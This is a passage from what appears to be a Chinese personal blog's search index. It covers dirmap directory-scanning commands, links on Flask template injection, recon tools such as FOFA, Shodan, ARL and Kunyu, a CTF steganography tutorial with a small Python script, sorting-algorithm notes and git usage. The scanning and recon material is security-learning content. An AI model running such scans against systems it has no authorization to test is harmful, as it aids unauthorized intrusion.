href="https://www.freebuf.com/sectool/200890.html">https://www.freebuf.com/sectool/200890.html</a>)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/H4ckForJob/dirmap.git &amp;&amp; cd dirmap &amp;&amp; python3 -m pip install -r requirement.txt  //环境准备</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -iU https://target.com -lcf //单个目标</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -iF urls.txt -lcf  //多个目标</span><br></pre></td></tr></table></figure>结果将自动保存在项目根目录下的output文件夹中，每一个目标生成一个txt，命名格式为目标域名.txt。</li></ol><hr><h3 id="flask注入（Python）"><a href="#flask注入（Python）" class="headerlink" title="flask注入（Python）"></a>flask注入（Python）</h3><p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a><br><a href="https://www.freebuf.com/articles/web/98928.html">https://www.freebuf.com/articles/web/98928.html</a><br><a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a><br>了解：<a href="https://www.cnblogs.com/mark--ping/p/11688725.html">https://www.cnblogs.com/mark--ping/p/11688725.html</a></p><p>Python API：<br><a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro">https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro</a>__</p><hr><p>代码格式化站点：<a href="https://www.html.cn/tool/js_beautify/">https://www.html.cn/tool/js_beautify/</a></p><p>xray:<a href="https://www.sqlsec.com/2020/04/xray.html">https://www.sqlsec.com/2020/04/xray.html</a><br><a href="https://docs.xray.cool/#/tutorial/prepare">https://docs.xray.cool/#/tutorial/prepare</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>学习工具集</title>
      <link href="/2020/01/08/useful-website/"/>
      <url>/2020/01/08/useful-website/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script defer src="https://cdn.jsdelivr.net/combine/npm/jquery@latest/dist/jquery.min.js,gh/weilining/jsdelivr/jquery/circlemagic/circlemagic.min.js,gh/weilining/jsdelivr@latest/jquery/circlemagic/butterflycirclemagic.js"></script><h1 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h1><p>唉!最近居然养成了深夜水文的习惯…|ू･ω･` )<br>下面放几个常用网站(物联网设备漏洞查询平台):<br><a href="https://fofa.so/">https://fofa.so/</a></p><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><p>查询域名ip，使用tcpip协议443端口</p><h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><p>交互模式:允许用户查询域名服务器，关于主机和域名的信息，输出域名内的主机列表。<br>非交互模式：输出主机或域名的名字。<br><img src="1.png"></p><h2 id="资产收集工具"><a href="#资产收集工具" class="headerlink" title="资产收集工具"></a>资产收集工具</h2><h3 id="ARL-Asset-Reconnaissance-Lighthouse-资产侦察灯塔系统"><a href="#ARL-Asset-Reconnaissance-Lighthouse-资产侦察灯塔系统" class="headerlink" title="ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统"></a>ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统</h3><p><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><h3 id="Kunyu"><a href="#Kunyu" class="headerlink" title="Kunyu"></a>Kunyu</h3><p>下载:<a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/knownsec/Kunyu.git</span><br><span class="line"><span class="built_in">cd</span> Kunyu</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">    python3 setup.py install</span><br><span class="line">    kunyu console</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">    <span class="built_in">cd</span> kunyu</span><br><span class="line">    python3 console.py</span><br><span class="line"></span><br><span class="line">PYPI:</span><br><span class="line">    pip3 install kunyu</span><br><span class="line">    </span><br><span class="line">P.S. Windows also supports python3 setup.py install.</span><br></pre></td></tr></table></figure><p>参考:<br><a href="https://paper.seebug.org/1654/">https://paper.seebug.org/1654/</a></p><hr><h2 id="云检测"><a href="#云检测" class="headerlink" title="云检测"></a>云检测</h2><p><a href="https://sandbox.vulbox.com/detect?theme=vulbox">https://sandbox.vulbox.com/detect?theme=vulbox</a></p><hr><h1 id="study"><a href="#study" class="headerlink" title="study"></a>study</h1><h2 id="渗透测试学习"><a href="#渗透测试学习" class="headerlink" title="渗透测试学习"></a>渗透测试学习</h2><p><a href="https://zhishihezi.net/c/ca2108d94cf521aa6a2e1172de967183">https://zhishihezi.net/c/ca2108d94cf521aa6a2e1172de967183</a></p><p><a href="https://zhishihezi.net/endpoint/textarea/85fbcb6eb62000d014629b087b406251?event=436b34f44b9f95fd3aa8667f1ad451b15bc1a81ff035e3dc30514ae32eac49f3c88b397fe2e390a362ee28e126dfab917f3403ccbed4259a435009cbb9f7ffc01b5728bcbab6c3d3d5e03e8a6b70fb5af8780cbdb36490c0b86584990194407dd67f6dfdb37ebb1f18f5eea9c5df290afca1e26a1ab4934761ef178bcfecaf5df0e7c1ea866a42945b5ae9ee6298fed274acd73e31e9e05045869bb6869e122d0aaa1ca5a2be1e71d006aa8814d361491a5698975d24506f4b3cf2b12de353df315ba18d15f8cad6cb4d218ea57652087f6a29ef8d3a910841c30ea9668b1d209d72a8e0e5a88c28ce58a2d69fc977c7f6b8208b0edf399162ec1d7a6b6e92cd#3">https://zhishihezi.net/endpoint/textarea/85fbcb6eb62000d014629b087b406251?event=436b34f44b9f95fd3aa8667f1ad451b15bc1a81ff035e3dc30514ae32eac49f3c88b397fe2e390a362ee28e126dfab917f3403ccbed4259a435009cbb9f7ffc01b5728bcbab6c3d3d5e03e8a6b70fb5af8780cbdb36490c0b86584990194407dd67f6dfdb37ebb1f18f5eea9c5df290afca1e26a1ab4934761ef178bcfecaf5df0e7c1ea866a42945b5ae9ee6298fed274acd73e31e9e05045869bb6869e122d0aaa1ca5a2be1e71d006aa8814d361491a5698975d24506f4b3cf2b12de353df315ba18d15f8cad6cb4d218ea57652087f6a29ef8d3a910841c30ea9668b1d209d72a8e0e5a88c28ce58a2d69fc977c7f6b8208b0edf399162ec1d7a6b6e92cd#3</a></p><p><a href="https://github.com/aldaor/HackerOneReports">https://github.com/aldaor/HackerOneReports</a></p><hr><h1 id="热门文章"><a href="#热门文章" class="headerlink" title="热门文章"></a>热门文章</h1><p><a href="https://vul.360.net/">https://vul.360.net/</a></p><p><a href="https://paper.seebug.org/">https://paper.seebug.org/</a></p><p><a href="https://sec-wiki.com/">https://sec-wiki.com/</a></p><p><a href="https://www.anquanke.com/">https://www.anquanke.com/</a></p><p><a href="https://security.tencent.com/index.php/blog">https://security.tencent.com/index.php/blog</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> tools-url </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-SortAlgorithm---Java十大排序算法</title>
      <link href="/2019/12/12/SortAlgorithm/"/>
      <url>/2019/12/12/SortAlgorithm/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><p>名词定义：<br>稳定：如果a原本在b前面，而a=b，排序之后a仍然在b的前面；<br>不稳定：如果a原本在b的前面，而a=b，排序之后a可能会出现在b的后面；<br>内排序：所有排序操作都在内存中完成；<br>外排序：由于数据太大，因此把数据放在磁盘中，而排序通过磁盘和内存的数据传输才能进行；<br>时间复杂度： 一个算法执行所耗费的时间。<br>空间复杂度：运行完一个程序所需内存的大小。</p><hr><h1 id="一、基本排序算法"><a href="#一、基本排序算法" class="headerlink" title="一、基本排序算法"></a>一、基本排序算法</h1><h2 id="1-选择排序-（Selection-Sort）"><a href="#1-选择排序-（Selection-Sort）" class="headerlink" title="1. 选择排序 （Selection Sort）"></a>1. 选择排序 （Selection Sort）</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/xzpx.png"></p><h2 id="2-插入排序-（Insertion-Sort）"><a href="#2-插入排序-（Insertion-Sort）" class="headerlink" title="2. 插入排序 （Insertion Sort）"></a>2. 插入排序 （Insertion Sort）</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/crpx.png"></p><h2 id="3-冒泡排序-（Bubble-Sort）"><a href="#3-冒泡排序-（Bubble-Sort）" class="headerlink" title="3. 冒泡排序 （Bubble Sort）"></a>3. 冒泡排序 （Bubble Sort）</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/mppx.png"></p><h1 id="二、高效排序算法"><a href="#二、高效排序算法" class="headerlink" title="二、高效排序算法"></a>二、高效排序算法</h1><h2 id="1-桶排序-（Bucket-Sort）"><a href="#1-桶排序-（Bucket-Sort）" class="headerlink" title="1. 桶排序 （Bucket Sort）"></a>1. 桶排序 （Bucket Sort）</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/tpx.png"></p><h2 id="2-希尔排序-Sell-Sort"><a href="#2-希尔排序-Sell-Sort" class="headerlink" title="2. 希尔排序 (Sell Sort)"></a>2. 希尔排序 (Sell Sort)</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/xepx.png"></p><h2 id="3-快速排序-（Quick-Sort）"><a href="#3-快速排序-（Quick-Sort）" class="headerlink" title="3. 快速排序 （Quick Sort）"></a>3. 快速排序 （Quick Sort）</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/kspx.png"></p><h2 id="4-堆排序-（Heap-Sort）"><a href="#4-堆排序-（Heap-Sort）" class="headerlink" title="4. 堆排序 （Heap Sort）"></a>4. 堆排序 （Heap Sort）</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/dpx.png"></p><h1 id="三、牺牲空间节约时间的高效排序"><a href="#三、牺牲空间节约时间的高效排序" class="headerlink" title="三、牺牲空间节约时间的高效排序"></a>三、牺牲空间节约时间的高效排序</h1><h2 id="1-归并排序-（Merge-Sort）"><a href="#1-归并排序-（Merge-Sort）" class="headerlink" title="1. 归并排序 （Merge Sort）"></a>1. 归并排序 （Merge Sort）</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/gbpx.png"></p><h2 id="2-基数排序-（Radix-Sort）（非比较排序）"><a href="#2-基数排序-（Radix-Sort）（非比较排序）" class="headerlink" title="2. 基数排序 （Radix Sort）（非比较排序）"></a>2. 基数排序 （Radix Sort）（非比较排序）</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/jspx.png"></p><h2 id="3-计数排序（Counting-Sort）（非比较排序）"><a href="#3-计数排序（Counting-Sort）（非比较排序）" class="headerlink" title="3. 计数排序（Counting Sort）（非比较排序）"></a>3. 计数排序（Counting Sort）（非比较排序）</h2><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/jishupx.png"></p><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/1.png"></p><p><img src="https://q0o0p.top/2019/12/12/SortAlgorithm/2.png"></p><p>比较排序：快速排序、归并排序、堆排序、冒泡排序；<br>非比较排序：计数排序、基数排序、桶排序；</p><p><a href="https://www.cnblogs.com/guoyaohua/p/8600214.html">https://www.cnblogs.com/guoyaohua/p/8600214.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>图片中的日记(图片隐写术)</title>
      <link href="/2019/11/28/steganography/"/>
      <url>/2019/11/28/steganography/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-常见文件的头文件"><a href="#1-常见文件的头文件" class="headerlink" title="1. 常见文件的头文件"></a>1. 常见文件的头文件</h2><table><thead><tr><th>文件类型</th><th>文件头</th></tr></thead><tbody><tr><td>jpeg</td><td>(jpg) FFD8FFE1</td></tr><tr><td>png</td><td>89504E47</td></tr><tr><td>gif</td><td>47494638</td></tr><tr><td>tif</td><td>49492A00</td></tr><tr><td>bmp</td><td>(windows bitmap)</td></tr><tr><td>aip</td><td>504B0304</td></tr><tr><td>rar</td><td>52617221</td></tr><tr><td>psd</td><td>(Adobe Photoshop)</td></tr></tbody></table><p>89 50 4E 47 0D 0A 1A 0A png的文件头<br>00 00 00 0D 说明IHDR头块长为13<br>49 48 44 52 （即为ASCII码的IHDR）是文件头数据块的标示（IDCH)<br>00 00 01 F4 图像的宽，500像素<br>00 00 01 A4 图像的高，420像素<br>CB D6 DF 8A为CRC校验<br>（可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到<br>文件宽度不能任意修改，需要根据 IHDR 块的 CRC 值爆破得到宽度,否则图片显示错误</p><h2 id="2-隐写工具"><a href="#2-隐写工具" class="headerlink" title="2. 隐写工具"></a>2. 隐写工具</h2><h3 id="0x01-steghide"><a href="#0x01-steghide" class="headerlink" title="0x01 steghide"></a>0x01 steghide</h3><p>Steghide是一款开源的隐写术软件<br>将post.txt文件隐藏到xxx.jpg中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）</span><br></pre></td></tr></table></figure><p>从xxx.jpg解出post.txt:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf xxx.jpg -p 123456（-p 密码）</span><br></pre></td></tr></table></figure><h3 id="0x02-outguess"><a href="#0x02-outguess" class="headerlink" title="0x02 outguess"></a>0x02 outguess</h3><ul><li>隐写<br>将a.txt和b.jpg隐写，输出c.jpg,隐写：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outguess -k <span class="string">&quot;123&quot;</span> -d a.txt b.jpg c.jpg  //,密码123</span><br><span class="line">outguess -d a.txt b.jpg c.jpg</span><br></pre></td></tr></table></figure></li><li>提取<br>从c.jpg中提取a.txt<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outguess -r c.jpg a.txt</span><br><span class="line">outguess -k <span class="string">&quot;123&quot;</span> -r c.jpg a.txt</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x03-cat-linux"><a href="#0x03-cat-linux" class="headerlink" title="0x03 cat(linux)"></a>0x03 cat(linux)</h3><p>linux cat合并文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat *.jpg &gt; q0o0p.jpg</span><br></pre></td></tr></table></figure><h3 id="0x04-copy-windows下的隐写"><a href="#0x04-copy-windows下的隐写" class="headerlink" title="0x04 copy (windows下的隐写)"></a>0x04 copy (windows下的隐写)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy/b q.jpg + 1.zip output.jpg</span><br></pre></td></tr></table></figure><hr><h2 id="隐写分离工具"><a href="#隐写分离工具" class="headerlink" title="隐写分离工具"></a>隐写分离工具</h2><h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><p>kali自带foremost</p><p>1.将所要解密的文件放入foremost所在的目录</p><p>将图片放入该目录下<br><img src="https://q0o0p.top/2020/01/28/steganography/1.jpg"><br>2.cmd进入foremost所在目录，cd 文件夹路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 待分离的文件名</span><br></pre></td></tr></table></figure><p>自动创建一个output文件夹，里面放分离出的文件<br>并且保证该文件夹为空</p><p>得到分离的文件<br><img src="https://q0o0p.top/2020/01/28/steganography/2.png"></p><hr><h2 id="自制图片隐写小工具"><a href="#自制图片隐写小工具" class="headerlink" title="自制图片隐写小工具"></a>自制图片隐写小工具</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys,re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFile</span>(<span class="params">path</span>):</span></span><br><span class="line">    file=&#123;&#125;</span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">dir</span>,folder,f <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            file[x]=i</span><br><span class="line">            x+=<span class="number">1</span></span><br><span class="line">    <span class="comment"># print(file)</span></span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_img</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(getFile(path))-<span class="number">1</span>):</span><br><span class="line">        img = <span class="built_in">open</span>(path + getFile(path)[i], <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        <span class="built_in">open</span>(path + getFile(path)[i], <span class="string">&quot;rb&quot;</span>).close()</span><br><span class="line">        q=<span class="built_in">open</span>(path +<span class="string">&#x27;q0o0p.jpg&#x27;</span>,<span class="string">&#x27;ab+&#x27;</span>).write(img) <span class="comment">#getFile(path)[4]</span></span><br><span class="line">        <span class="built_in">open</span>(path +<span class="string">&#x27;q0o0p.jpg&#x27;</span> , <span class="string">&#x27;ab+&#x27;</span>).close() <span class="comment">#getFile(path)[4]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_img</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    jpg_head=<span class="string">b&#x27;\xff\xd8\xff\xe1&#x27;</span></span><br><span class="line">    jpg_end=<span class="string">b&#x27;\xff\xd9&#x27;</span></span><br><span class="line">    l1=[]</span><br><span class="line">    l2=[]</span><br><span class="line">    img = <span class="built_in">open</span>(path +<span class="string">&#x27;q0o0p.jpg&#x27;</span>, <span class="string">&quot;rb&quot;</span>).read() <span class="comment"># getFile(path)[0]</span></span><br><span class="line">    re_head=re.finditer(jpg_head, img)</span><br><span class="line">    re_end=re.finditer(jpg_end, img)</span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    <span class="comment"># img头</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re_head:</span><br><span class="line">        l1.append(i.span())</span><br><span class="line">        x+=<span class="number">1</span></span><br><span class="line">        <span class="comment">#img尾</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> re_end:</span><br><span class="line">        l2.append(c.span())</span><br><span class="line">    y=<span class="number">0</span></span><br><span class="line">    di=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l1[<span class="number">0</span>::<span class="number">2</span>]:</span><br><span class="line">        di[y]=i[<span class="number">0</span>]</span><br><span class="line">        y+=<span class="number">1</span></span><br><span class="line">    <span class="comment"># print(di)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(di)-<span class="number">1</span>):</span><br><span class="line">    <span class="comment">#head的第一个==end的第二个数</span></span><br><span class="line">        im= <span class="built_in">open</span>(path+<span class="built_in">str</span>(i)+<span class="string">&#x27;_.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(img[di[i]:di[i+<span class="number">1</span>]])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path = <span class="string">&#x27;./src/&#x27;</span></span><br><span class="line">    <span class="comment"># getFile(path)</span></span><br><span class="line">    merge_img(path)</span><br><span class="line">    <span class="comment"># split_img(path)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>隐写工具介绍及总结:  <a href="https://www.jianshu.com/p/b61e4ff0b0d5%60">https://www.jianshu.com/p/b61e4ff0b0d5`</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git的使用</title>
      <link href="/2019/11/12/git/"/>
      <url>/2019/11/12/git/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>##1.绑定用户<br>打开git-bash.exe（直接在桌面上点击右键，或者点击开始按钮找到Git Bash）<br>运行gitBash.gif</p><p>在打开的GIt Bash中输入以下命令（用户和邮箱为你github注册的账号和邮箱）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;q0o0p-wow&quot;</span><br><span class="line">$ git config --global user.email &quot;2825966877@qq.com&quot;</span><br></pre></td></tr></table></figure><p>##2.设置SSH key<br>先检查是否已生成密钥cd ~/.ssh，如果返回的ls有3个文件,则密钥已经生成。<br>如果没有密钥，执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;2825966877@qq.com&quot;</span><br></pre></td></tr></table></figure><p><img src="1.png"></p><p>生成过程中一路按3次回车键就好了。第二次回车为设置密码（默认路径，默认没有密码登录）<br>生成成功后，去对应目录C:\Users\ASUS\ssh里面找公钥<br>  id_rsa 是私钥<br>  id_rsa.pub是公钥<br>只需复制公钥即可。<br>接下来为github账号配置ssh key<br>切换到github，在右上角找到settings，然后打开SSH keys菜单， 点击Add SSH key新增密钥，填上标题（最好跟本地仓库保持一致）。</p><p>设置sshkey.gif<br>接着将id_rsa.pub文件中key粘贴到此，最后Add key生成密钥。</p><p>##3.建立本地仓库<br>cd 切换路径，打开blog（你的文件夹名）文件夹，执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git add   //将所有文件添加到仓库</span><br><span class="line">git commit -m &quot;提交文件&quot;  //双引号内是提交注释</span><br></pre></td></tr></table></figure><p>初始化成功后你会发现项目里多了一个隐藏文件夹.git</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -ah  //可用此命令查看</span><br></pre></td></tr></table></figure><h2 id="4-关联github仓库"><a href="#4-关联github仓库" class="headerlink" title="4.关联github仓库"></a>4.关联github仓库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin https://github.com/q0o0p-wow/blog.git</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h1><p>假如我们现在在dev分支上，刚开发完项目，执行了下列命令：<br>git  add .<br>git  commit -m ‘提交的备注信息’<br>git  push -u origin dev<br>想将dev分支合并到master分支，操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout master //切换到master分支上</span><br><span class="line">$ git pull origin master //远程仓库里的项目拉下来</span><br><span class="line">$ git  merge dev</span><br></pre></td></tr></table></figure><p>（如果是多人开发的话 需要把远程master上的代码pull下来）</p><p>删除文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git rm -r --cached 目标文件夹 </span><br><span class="line">git commit -m &#x27;删除说明&#x27;</span><br><span class="line">git push -u origin master //重新提交</span><br></pre></td></tr></table></figure><hr><h1 id="git分支的管理"><a href="#git分支的管理" class="headerlink" title="git分支的管理"></a>git分支的管理</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ git branch  //如果不加任何参数运行它，会得到当前所有分支的一个列表</span><br><span class="line">$ git branch -r //查看远程分支</span><br><span class="line">$ git checkout -b master origin/master //把远程分支master 拉取到本地</span><br><span class="line">$ git checkout 分支名称  //切换分支</span><br><span class="line">$ history  //查看历史</span><br><span class="line">$ git status //查看要提交的条件</span><br><span class="line">$ git add . //全部提交</span><br><span class="line">$ git commit -m &#x27;注释&#x27;//提交注释</span><br><span class="line">$ git push origin  本地分支名 ： 远程分支名  //上传本地当前分支代码到远程分支</span><br><span class="line"></span><br><span class="line">$ git branch -m 原名 新  //改名</span><br></pre></td></tr></table></figure><hr><p>#git 仓库管理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git remote -v //远程仓库路径查询</span><br><span class="line"></span><br><span class="line">git remote add origin &lt;你的项目地址&gt; //添加远程仓库，注:项目地址形式为https://gitee.com/xxx/xxx.git或者 git@gitee.com:xxx/xxx.git</span><br><span class="line"></span><br><span class="line">git remote rm origin  //删除指定的远程</span><br><span class="line"></span><br><span class="line">git push origin -d dev  //删除远程分支</span><br><span class="line"></span><br><span class="line">git branch -d -r origin/dev  //只删除本地分支</span><br><span class="line">git branch -d 名称  </span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/weixin_41883384/article/details/80805580">https://blog.csdn.net/weixin_41883384/article/details/80805580</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IntelliJ IDEA 快捷键</title>
      <link href="/2019/11/09/IntelliJ%20IDEA/"/>
      <url>/2019/11/09/IntelliJ%20IDEA/</url>
      
